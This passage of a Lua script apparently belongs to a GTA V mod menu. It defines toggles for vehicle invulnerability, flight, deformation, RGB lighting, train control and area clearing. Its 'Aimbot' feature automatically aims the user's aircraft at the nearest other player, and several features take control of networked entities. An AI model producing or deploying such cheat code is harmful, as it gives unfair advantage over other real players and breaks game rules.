		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, f.on, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Meleeproof"] = menu.add_feature("Meleeproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, f.on, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Steamproof"] = menu.add_feature("Steamproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, f.on, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Drownproof"] = menu.add_feature("Drownproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, f.on)
		end
	end
end)

feature["Enter Nearest Vehicle"] = menu.add_feature("Enter Nearest Vehicle", "action", localparents["Vehicle Options"].id, function(f)
	local vehicles = vehicle.get_all_vehicles()
	table.sort(vehicles, function(a, b)
		return (utilities.get_distance_between(a, player.get_player_coords(player.player_id())) < utilities.get_distance_between(b, player.get_player_coords(player.player_id())))
	end)
	if ped.is_ped_a_player(vehicle.get_ped_in_vehicle_seat(vehicles[1], -1)) and player.get_player_from_ped(vehicle.get_ped_in_vehicle_seat(vehicles[1], -1)) ~= player.player_id() then
		ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), vehicles[1], -2)
	else
		utilities.request_control(vehicle.get_ped_in_vehicle_seat(vehicles[1], -1))
		utilities.request_control(vehicles[1])
		ped.set_ped_into_vehicle(vehicle.get_ped_in_vehicle_seat(vehicles[1], -1), vehicles[1], -2)
		ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), vehicles[1], -1)
	end
end)

feature["Hard Remove Vehicle"] = menu.add_feature("Hard Remove Vehicle", "action", localparents["Vehicle Options"].id, function(f)
	if player.is_player_in_any_vehicle(player.player_id()) then
		if utilities.request_control(player.get_player_vehicle(player.player_id())) then
			entity_func.hard_remove_entity(player.get_player_vehicle(player.player_id()))
		end
	end
end)

feature["Force Leave Vehicle"] = menu.add_feature("Force Leave Vehicle", "action", localparents["Vehicle Options"].id, function(f)
	if player.is_player_in_any_vehicle(player.player_id()) then
		ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
	end
end)

feature["Vehicle Fly"] = menu.add_feature("Vehicle Fly", "slider", localparents["Vehicle Options"].id, function(f)
	while f.on do
		system.yield(0)
		if player.is_player_in_any_vehicle(player.player_id()) and player_func.is_player_driver(player.player_id()) then
			network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
			entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), v3(0, 0, 0))
			entity.set_entity_rotation(player.get_player_vehicle(player.player_id()), v3(cam.get_gameplay_cam_rot().x, 0, cam.get_gameplay_cam_rot().z))
			if not controls.is_disabled_control_pressed(2, 77) and not controls.is_disabled_control_pressed(2, 133) and not controls.is_disabled_control_pressed(2, 134) and not controls.is_disabled_control_pressed(2, 139) and not controls.is_disabled_control_pressed(2, 254) and not controls.is_disabled_control_pressed(2, 326) then
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 77) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				local pos = player.get_player_coords(player.player_id())
				local dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id()))
				dir:transformRotToDir()
				dir = dir * 8
				pos = pos + dir
				dir = nil
				local pos_target = player.get_player_coords(player.player_id())
				dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id()))
				dir:transformRotToDir()
				dir = dir * 100
				pos_target = pos_target + dir
				local vectorV3 = pos_target - pos
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, vectorV3.x * f.value, vectorV3.y * f.value, vectorV3.z * f.value, 0.0, 0.0, 0.0, false, true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 133) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				local pos = player.get_player_coords(player.player_id())
				local dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) + v3(0, 0, 90)
				dir:transformRotToDir()
				dir = dir * 8
				pos = pos + dir
				dir = nil
				local pos_target = player.get_player_coords(player.player_id())
				dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) + v3(0, 0, 90)
				dir:transformRotToDir()
				dir = dir * 100
				pos_target = pos_target + dir
				local vectorV3 = pos_target - pos
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, vectorV3.x * f.value, vectorV3.y * f.value, vectorV3.z * f.value, 0.0, 0.0, 0.0, false, true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 134) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				local pos = player.get_player_coords(player.player_id())
				local dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) - v3(0, 0, 90)
				dir:transformRotToDir()
				dir = dir * 8
				pos = pos + dir
				dir = nil
				local pos_target = player.get_player_coords(player.player_id())
				dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) - v3(0, 0, 90)
				dir:transformRotToDir()
				dir = dir * 100
				pos_target = pos_target + dir
				local vectorV3 = pos_target - pos
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, vectorV3.x * f.value, vectorV3.y * f.value, vectorV3.z * f.value, 0.0, 0.0, 0.0, false, true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 139) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				local pos = player.get_player_coords(player.player_id())
				local dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) + v3(0, 0, 180)
				dir:transformRotToDir()
				dir = dir * 8
				pos = pos + dir
				dir = nil
				local pos_target = player.get_player_coords(player.player_id())
				dir = entity.get_entity_rotation(player.get_player_vehicle(player.player_id())) + v3(0, 0, 180)
				dir:transformRotToDir()
				dir = dir * 100
				pos_target = pos_target + dir
				local vectorV3 = pos_target - pos
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, vectorV3.x * f.value, vectorV3.y * f.value, vectorV3.z * f.value, 0.0, 0.0, 0.0, false, true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 254) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, 0, 0, 180, 0.0, 0.0, 0.0, false, true)
			end
			if player.is_player_in_any_vehicle(player.player_id()) and controls.is_disabled_control_pressed(2, 326) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
				entity.apply_force_to_entity(player.get_player_vehicle(player.player_id()), 3, 0, 0, -180, 0.0, 0.0, 0.0, false, true)
			end
		end
	end
	if player.is_player_in_any_vehicle(player.player_id()) and player_func.is_player_driver(player.player_id()) then
		entity.freeze_entity(player.get_player_vehicle(player.player_id()), false)
		system.yield(20)
		local velocity = entity.get_entity_velocity(player.get_player_vehicle(player.player_id()))
		system.yield(20)
		entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), entity.get_entity_coords(player.get_player_vehicle(player.player_id())))
		entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), velocity)
	end
end)
feature["Vehicle Fly"].max = 5
feature["Vehicle Fly"].min = 0.2
feature["Vehicle Fly"].mod = 0.2
feature["Vehicle Fly"].value = 2

feature["Remove Plane Turbulence"] = menu.add_feature("Remove Plane Turbulence", "toggle", localparents["Vehicle Options"].id, function(f)
	if f.on then
		while f.on do
			system.yield(1000)
			if player.is_player_in_any_vehicle(player.player_id()) and streaming.is_model_a_plane(entity.get_entity_model_hash(player.get_player_vehicle(player.player_id()))) then
				network.request_control_of_entity(player.get_player_vehicle(player.player_id()))
				natives.SET_PLANE_TURBULENCE_MULTIPLIER(player.get_player_vehicle(player.player_id()), 0.0)
			end
		end
	end
end)

localparents["Deformation"] = menu.add_feature("Deformation", "parent", localparents["Vehicle Options"].id)

feature["Convert To Zip"] = menu.add_feature("Convert To Zip", "action", localparents["Deformation"].id, function(f)
	if player.is_player_in_any_vehicle(player.player_id()) then
		local vehicle_ = player.get_player_vehicle(player.player_id())
		utilities.request_control(vehicle_)
		natives.SET_VEHICLE_CAN_DEFORM_WHEELS(vehicle_, true)
		for i = 0, 8 do
			natives.SET_VEHICLE_DOOR_BROKEN(vehicle_, i, true)
		end
		if vehicle.get_vehicle_wheel_count(vehicle_) ~= nil then
			for i = 0, vehicle.get_vehicle_wheel_count(vehicle_) do
				vehicle.set_vehicle_wheel_tire_radius(vehicle_, i, 0.001)
				vehicle.set_vehicle_wheel_rim_radius(vehicle_, i, 0.001)
				vehicle.set_vehicle_wheel_tire_width(vehicle_, i, 0.001)
				vehicle.set_vehicle_wheel_render_size(vehicle_, 0)
			end
		end
		for i = 0, 20 do
			vehicle.set_vehicle_extra(vehicle_, i, true)
		end
		local min, max = entity.get_entity_model_dimensions(vehicle_)
		local X = (max.x - min.x) * 0.5
		local Y = (max.y - min.y) * 0.5
		local Z = (max.z - min.z) * 0.5
		local halfY = Y * 0.5
		local positions = {v3(-X, Y,  0.0), v3(-X, Y,  Z), v3(0.0, Y,  0.0), v3(0.0, Y,  Z), v3(X, Y,  0.0), v3(X, Y,  Z), v3(-X, halfY,  0.0), v3(-X, halfY,  Z), v3(0.0, halfY,  0.0), v3(0.0, halfY,  Z), v3(X, halfY,  0.0), v3(X, halfY,  Z), v3(-X, 0.0,  0.0), v3(-X, 0.0,  Z), v3(0.0, 0.0,  0.0), v3(0.0, 0.0,  Z), v3(X, 0.0,  0.0), v3(X, 0.0,  Z), v3(-X, -halfY,  0.0), v3(-X, -halfY,  Z), v3(0.0, -halfY,  0.0), v3(0.0, -halfY,  Z), v3(X, -halfY,  0.0), v3(X, -halfY,  Z), v3(-X, -Y,  0.0), v3(-X, -Y,  Z), v3(0.0, -Y,  0.0), v3(0.0, -Y,  Z), v3(X, -Y,  0.0), v3(X, -Y,  Z)}
		local time = utils.time_ms() + 500
		while time > utils.time_ms() do
			natives.SET_VEHICLE_DAMAGE(vehicle_, min.x, min.y, min.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, max.x, min.y, min.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, min.x, max.y, min.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, min.x, min.y, max.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, max.x, max.y, min.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, min.x, max.y, max.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, max.x, min.y, max.z, 2147483647.0, 2147483647.0, true)
			natives.SET_VEHICLE_DAMAGE(vehicle_, max.x, max.y, max.z, 2147483647.0, 2147483647.0, true)
			for i = 1, #positions do
				natives.SET_VEHICLE_DAMAGE(vehicle_, positions[i], 2147483647.0, 2147483647.0, true)
			end
			system.yield(0)
		end
	end
end)

local save_vehicle_deformation = {}

feature["Save Deformation"] = menu.add_feature("Save Deformation", "action", localparents["Deformation"].id, function(f)
	if player.is_player_in_any_vehicle(player.player_id()) then
		local min, max = entity.get_entity_model_dimensions(player.get_player_vehicle(player.player_id()))
		local X = (max.x - min.x) * 0.5
		local Y = (max.y - min.y) * 0.5
		local Z = (max.z - min.z) * 0.5
		local halfY = Y * 0.5
		local positions = {v3(-X, Y,  0.0), v3(-X, Y,  Z), v3(0.0, Y,  0.0), v3(0.0, Y,  Z), v3(X, Y,  0.0), v3(X, Y,  Z), v3(-X, halfY,  0.0), v3(-X, halfY,  Z), v3(0.0, halfY,  0.0), v3(0.0, halfY,  Z), v3(X, halfY,  0.0), v3(X, halfY,  Z), v3(-X, 0.0,  0.0), v3(-X, 0.0,  Z), v3(0.0, 0.0,  0.0), v3(0.0, 0.0,  Z), v3(X, 0.0,  0.0), v3(X, 0.0,  Z), v3(-X, -halfY,  0.0), v3(-X, -halfY,  Z), v3(0.0, -halfY,  0.0), v3(0.0, -halfY,  Z), v3(X, -halfY,  0.0), v3(X, -halfY,  Z), v3(-X, -Y,  0.0), v3(-X, -Y,  Z), v3(0.0, -Y,  0.0), v3(0.0, -Y,  Z), v3(X, -Y,  0.0), v3(X, -Y,  Z)}
		for i = 1, #positions do
			local deformation_ = natives.GET_VEHICLE_DEFORMATION_AT_POS(player.get_player_vehicle(player.player_id()), positions[i])
			save_vehicle_deformation[#save_vehicle_deformation + 1] = {positions[i], deformation_}
		end
	end
end)

feature["Apply Deformation"] = menu.add_feature("Apply Deformation", "action", localparents["Deformation"].id, function(f)
	if player.is_player_in_any_vehicle(player.player_id()) then
		for i = 1, #save_vehicle_deformation do
			natives.SET_VEHICLE_DAMAGE(player.get_player_vehicle(player.player_id()), save_vehicle_deformation[i][1], 2147483647.0, 2147483647.0, true)
		end
	end
end)

localparents["Vehicle Mods"] = menu.add_feature("Vehicle Mods", "parent", localparents["Vehicle Options"].id)

localparents["RGB"] = menu.add_feature("RGB", "parent", localparents["Vehicle Mods"].id)

feature["RGB Neons"] = menu.add_feature("RGB Neons", "slider", localparents["RGB"].id, function(f)
	while f.on do
		system.yield(0)
		if player.is_player_in_any_vehicle(player.player_id()) then
			for i = 0, 7 do
				if not vehicle.is_vehicle_neon_light_enabled(player.get_player_vehicle(player.player_id()), i) then
					vehicle.set_vehicle_neon_light_enabled(player.get_player_vehicle(player.player_id()), i, true)
				end
			end
			vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(255, 5, 5))
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(255, i, 5))
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(i, 255, 5))
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(5, 255, i))
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(5, i, 255))
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(i, 5, 255))
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_neon_lights_color(player.get_player_vehicle(player.player_id()), text_func.rgba_to_uint32_t(255, 5, i))
					system.yield(math.tointeger(f.value))
				end
			end
		end
	end
end)
feature["RGB Neons"].max = 50
feature["RGB Neons"].min = 0
feature["RGB Neons"].mod = 1
feature["RGB Neons"].value = 0

feature["RGB Tire Smoke"] = menu.add_feature("RGB Tire Smoke", "slider", localparents["RGB"].id, function(f)
	while f.on do
		system.yield(0)
		if player.is_player_in_any_vehicle(player.player_id()) then
			vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), 255, 5, 5)
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), 255, i, 5)
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), i, 255, 5)
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), 5, 255, i)
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), 5, i, 255)
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 5, 255 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), i, 5, 255)
					system.yield(math.tointeger(f.value))
				end
			end
			for i = 255, 5, -1 do
				if f.on then
					vehicle.set_vehicle_tire_smoke_color(player.get_player_vehicle(player.player_id()), 255, 5, i)
					system.yield(math.tointeger(f.value))
				end
			end
		end
	end
end)
feature["RGB Tire Smoke"].max = 50
feature["RGB Tire Smoke"].min = 0
feature["RGB Tire Smoke"].mod = 1
feature["RGB Tire Smoke"].value = 0

feature["RGB Headlights"] = menu.add_feature("RGB Headlights", "slider", localparents["RGB"].id, function(f)
	while f.on do
		system.yield(0)
		if player.is_player_in_any_vehicle(player.player_id()) then
			for i = 0, 12 do
				if f.on then
					vehicle.set_vehicle_headlight_color(player.get_player_vehicle(player.player_id()), i)
					system.yield(math.tointeger(f.value))
				end
			end
		end
	end
end)
feature["RGB Headlights"].max = 500
feature["RGB Headlights"].min = 100
feature["RGB Headlights"].mod = 10
feature["RGB Headlights"].value = 100

localparents["Vehicle Weapons"] = menu.add_feature("Vehicle Weapons", "parent", localparents["Vehicle Mods"].id)

feature["Aimbot"] = menu.add_feature("Aimbot", "value_str", localparents["Vehicle Weapons"].id, function(f)
	while f.on do
		if player.is_player_in_any_vehicle(player.player_id()) then
			if streaming.is_model_a_heli(entity.get_entity_model_hash(player.get_player_vehicle(player.player_id()))) or streaming.is_model_a_plane(entity.get_entity_model_hash(player.get_player_vehicle(player.player_id()))) then
				local success, current_weapon = natives.GET_CURRENT_PED_VEHICLE_WEAPON(player.get_player_ped(player.player_id()))
				if success and current_weapon ~= 0 then
					if controls.is_disabled_control_pressed(0, 70) then
						local rotation = entity.get_entity_rotation(player.get_player_vehicle(player.player_id()))
						local velocity
						if streaming.is_model_a_plane(entity.get_entity_model_hash(player.get_player_vehicle(player.player_id()))) then
							velocity = entity.get_entity_velocity(player.get_player_vehicle(player.player_id()))
						end
						while controls.is_disabled_control_pressed(0, 70) do
							local player_ = player_func.get_closest_player_to_coords_in_range(player.get_player_coords(player.player_id()), 800)
							if player_ ~= player.player_id() and player_ ~= nil then
								entity.set_entity_rotation(player.get_player_vehicle(player.player_id()), utilities.get_rotation_from_entity_to_position(player.get_player_vehicle(player.player_id()), player.get_player_coords(player_) + v3(0, 0, 2)))
							end
							system.yield(0)
						end
						if rotation then
							entity.set_entity_rotation(player.get_player_vehicle(player.player_id()), rotation)
							rotation = nil
						end
						if velocity then
							entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), velocity)
							velocity = nil
						end
					end
				end
			end
		end
		system.yield(0)
	end
end)
feature["Aimbot"]:set_str_data({"v1", "v2"})

feature["Static Horn Boost"] = menu.add_feature("Static Horn Boost", "slider", localparents["Vehicle Options"].id, function(f)
	local FeatBool
	local Feat = menu.get_feature_by_hierarchy_key("local.vehicle_options.horn_boost")
	if f.on then
		FeatBool = Feat.on
		Feat.on = false
		while f.on do
			system.yield(0)
			if player.is_player_in_any_vehicle(player.player_id()) and player.is_player_pressing_horn(player.player_id()) then
				if entity.get_entity_speed(player.get_player_vehicle(player.player_id())) >= f.value then
					vehicle.set_vehicle_forward_speed(player.get_player_vehicle(player.player_id()), entity.get_entity_speed(player.get_player_vehicle(player.player_id())))
				else
					vehicle.set_vehicle_forward_speed(player.get_player_vehicle(player.player_id()), f.value)
				end
			end
		end
	end
	Feat.on = FeatBool or false
end)
feature["Static Horn Boost"].max = 200
feature["Static Horn Boost"].min = 10
feature["Static Horn Boost"].mod = 10
feature["Static Horn Boost"].value = 10

localparents["Train Controls"] = menu.add_feature("Train Controls", "parent", localparents["Vehicle Options"].id)

feature["Enter Nearest Train"] = menu.add_feature("Enter Nearest Train", "action", localparents["Train Controls"].id, function(f)
	local vehicles = vehicle.get_all_vehicles()
	local found_index = false
	for i = 1, #vehicles do
		if entity.get_entity_model_hash(vehicles[i]) == 1030400667 or entity.get_entity_model_hash(vehicles[i]) == 868868440 then
			if not found_index then
				utilities.request_control(vehicles[i])
				local ped_in_seat = vehicle.get_ped_in_vehicle_seat(vehicles[i], -1)
				if ped_in_seat and not ped.is_ped_a_player(ped_in_seat) then
					entity.delete_entity(ped_in_seat)
				end
				ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), vehicles[i], -1)
			end
			found_index = true
		end
	end
	if not found_index then
		menu.notify("Couldn't find a train!", AddictScript, 4, NotifyColours["red"])
	end
end)

feature["Train Key Control"] = menu.add_feature("Train Key Control", "toggle", localparents["Train Controls"].id, function(f)
	if f.on then
		local TrainSpeed = 10.0
		while f.on do
			system.yield(10)
			if player_func.is_player_driving_train(player.player_id()) then
				local New_Request = false
				if controls.is_disabled_control_pressed(2, 32) then
					TrainSpeed = TrainSpeed + 1.0
					New_Request = true
				end
				if controls.is_disabled_control_pressed(2, 33) then
					TrainSpeed = TrainSpeed - 1.0
					New_Request = true
				end
				if New_Request then
					natives.SET_TRAIN_SPEED(player.get_player_vehicle(player.player_id()), TrainSpeed)
					natives.SET_TRAIN_CRUISE_SPEED(player.get_player_vehicle(player.player_id()), TrainSpeed)
				end
			end
		end
	end
end)

feature["Halt Train"] = menu.add_feature("Halt Train", "toggle", localparents["Train Controls"].id, function(f)
	while f.on do
		system.yield(0)
		if player_func.is_player_driving_train(player.player_id()) then
			natives.SET_TRAIN_SPEED(player.get_player_vehicle(player.player_id()), 0.0)
			natives.SET_TRAIN_CRUISE_SPEED(player.get_player_vehicle(player.player_id()), 0.0)
		end
	end
end)

feature["Force Leave Train"] = menu.add_feature("Force Leave Train", "action", localparents["Train Controls"].id, function(f)
	if player_func.is_player_driving_train(player.player_id()) then
		ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
	end
end)

feature["Delete All Trains"] = menu.add_feature("Delete All Trains", "action", localparents["Train Controls"].id, function(f)
	natives.DELETE_ALL_TRAINS()
end)

feature["Derail"] = menu.add_feature("Derail", "toggle", localparents["Train Controls"].id, function(f)
	if player_func.is_player_driving_train(player.player_id()) then
		if f.on then
			natives.SET_RENDER_TRAIN_AS_DERAILED(player.get_player_vehicle(player.player_id()), true)
		end
		if not f.on then
			natives.SET_RENDER_TRAIN_AS_DERAILED(player.get_player_vehicle(player.player_id()), false)
		end
	end
end)

feature["Disable Random Train Spawning"] = menu.add_feature("Disable Random Train Spawning", "toggle", localparents["Train Controls"].id, function(f)
	while f.on do
		system.yield(0)
		natives.SET_DISABLE_RANDOM_TRAINS_THIS_FRAME(true)
	end
end)

localparents["World"] = menu.add_feature("World", "parent", localparents["Local"].id)

feature["Unload Map"] = menu.add_feature("Unload Map", "toggle", localparents["World"].id, function(f)
	while f.on do
		system.yield(0)
		natives.SET_FOCUS_POS_AND_VEL(-8292.664, -4596.8257, 14358.0, 0.0, 0.0, 0.0)
		natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(player.get_player_coords(player.player_id()))
	end
	natives.CLEAR_FOCUS()
end)

localparents["Entity Control"] = menu.add_feature("Entity Control", "parent", localparents["World"].id)

localparents["Entity Control Peds"] = menu.add_feature("Peds", "parent", localparents["Entity Control"].id)

feature["Disable Ped Spawning"] = menu.add_feature("Disable Ped Spawning", "toggle", localparents["Entity Control Peds"].id, function(f)
	while f.on do
		ped.set_ped_density_multiplier_this_frame(0.0)
		system.yield(0)
	end
end)

localparents["Entity Control Vehicles"] = menu.add_feature("Vehicles", "parent", localparents["Entity Control"].id)

feature["Disable Vehicle Spawning"] = menu.add_feature("Disable Vehicle Spawning", "toggle", localparents["Entity Control Vehicles"].id, function(f)
	while f.on do
		vehicle.set_vehicle_density_multipliers_this_frame(0.0)
		system.yield(0)
	end
end)

localparents["Entity Control Objects"] = menu.add_feature("Objects", "parent", localparents["Entity Control"].id)

localparents["Clear Area"] = menu.add_feature("Clear Area", "parent", localparents["Entity Control"].id)

feature["Clear Area Of Peds"] = menu.add_feature("Clear Area Of Peds", "value_i", localparents["Clear Area"].id, function(f)
	while f.on do
		natives.CLEAR_AREA_OF_PEDS(player.get_player_coords(player.player_id()), tonumber(f.value .. ".0"), 0)
		system.yield(0)
	end
end)
feature["Clear Area Of Peds"].max = 1000
feature["Clear Area Of Peds"].min = 50
feature["Clear Area Of Peds"].mod = 50
feature["Clear Area Of Peds"].value = 50

feature["Clear Area Of Vehicles"] = menu.add_feature("Clear Area Of Vehicles", "value_i", localparents["Clear Area"].id, function(f)
	while f.on do
		natives.CLEAR_AREA_OF_VEHICLES(player.get_player_coords(player.player_id()), tonumber(f.value .. ".0"), false, false, false, false, false, false, false)
		system.yield(0)
	end
end)
feature["Clear Area Of Vehicles"].max = 1000
feature["Clear Area Of Vehicles"].min = 50
feature["Clear Area Of Vehicles"].mod = 50
feature["Clear Area Of Vehicles"].value = 50

feature["Clear Area Of Objects"] = menu.add_feature("Clear Area Of Objects", "value_i", localparents["Clear Area"].id, function(f)
	while f.on do
		natives.CLEAR_AREA_OF_OBJECTS(player.get_player_coords(player.player_id()), tonumber(f.value .. ".0"), 0)
		system.yield(0)
	end
end)
feature["Clear Area Of Objects"].max = 1000
feature["Clear Area Of Objects"].min = 50
feature["Clear Area Of Objects"].mod = 50
feature["Clear Area Of Objects"].value = 50

feature["Clear Area Of Cops"] = menu.add_feature("Clear Area Of Cops", "value_i", localparents["Clear Area"].id, function(f)
	while f.on do
		natives.CLEAR_AREA_OF_COPS(player.get_player_coords(player.player_id()), tonumber(f.value .. ".0"), 0)
		system.yield(0)
	end
end)
feature["Clear Area Of Cops"].max = 1000
feature["Clear Area Of Cops"].min = 50
feature["Clear Area Of Cops"].mod = 50
feature["Clear Area Of Cops"].value = 50

feature["Clear Area Of Projectiles"] = menu.add_feature("Clear Area Of Projectiles", "value_i", localparents["Clear Area"].id, function(f)
	while f.on do
		natives.CLEAR_AREA_OF_PROJECTILES(player.get_player_coords(player.player_id()), tonumber(f.value .. ".0"), 0)
		system.yield(0)
	end
end)
feature["Clear Area Of Projectiles"].max = 1000
feature["Clear Area Of Projectiles"].min = 50
feature["Clear Area Of Projectiles"].mod = 50
feature["Clear Area Of Projectiles"].value = 50

feature["Drive/Walk On The Ocean"] = menu.add_feature("Drive/Walk On The Ocean", "toggle", localparents["World"].id, function(f)
	utilities.request_model(gameplay.get_hash_key("stt_prop_stunt_target"))
	while f.on do
		if not meteor_entities["Drive/Walk On The Ocean"] then
			meteor_entities["Drive/Walk On The Ocean"] = object.create_object(gameplay.get_hash_key("stt_prop_stunt_target"), player.get_player_coords(player.player_id()), true, false)
		end
		if not entity.is_an_entity(meteor_entities["Drive/Walk On The Ocean"]) then
			meteor_entities["Drive/Walk On The Ocean"] = object.create_object(gameplay.get_hash_key("stt_prop_stunt_target"), player.get_player_coords(player.player_id()), true, false)
		end
		if meteor_entities["Drive/Walk On The Ocean"] then
			if entity.is_an_entity(meteor_entities["Drive/Walk On The Ocean"]) then
				entity.set_entity_coords_no_offset(meteor_entities["Drive/Walk On The Ocean"], v3(player.get_player_coords(player.player_id()).x, player.get_player_coords(player.player_id()).y, -5.0))
				entity.set_entity_visible(meteor_entities["Drive/Walk On The Ocean"], false)
			end
		end
		water.set_waves_intensity(-100000000.0)
		system.yield(0)
	end
	if meteor_entities["Drive/Walk On The Ocean"] then
		network.request_control_of_entity(meteor_entities["Drive/Walk On The Ocean"])
		entity.delete_entity(meteor_entities["Drive/Walk On The Ocean"])
	end
	water.reset_waves_intensity()
end)

